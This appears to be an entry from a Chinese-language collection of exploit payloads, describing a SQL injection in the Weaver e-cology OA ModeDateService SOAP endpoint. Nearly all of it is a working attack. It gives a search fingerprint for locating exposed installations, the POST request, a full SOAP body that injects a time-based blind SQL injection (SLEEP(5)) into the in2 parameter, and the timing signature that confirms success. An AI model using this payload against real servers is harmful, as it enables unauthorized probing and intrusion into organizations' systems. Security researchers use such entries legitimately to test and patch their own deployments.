# 泛微-ecologyModeDateServicesql注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`app="泛微-E-Weaver"`
- **请求**：`POST /services/ModeDateService HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
<soapenv:Header/>
<soapenv:Body>
<mod:getAllModeDataCount>
<mod:in0>1</mod:in0>
<mod:in1>1</mod:in1>
<mod:in2>(SELECT 8544 FROM (SELECT(SLEEP(5)))NZeo)</mod:in2>
<mod:in3>1</mod:in3>
</mod:getAllModeDataCount>
</soapenv:Body>
</soapenv:Envelope>
```
- **响应特征**：200 响应时间>=5s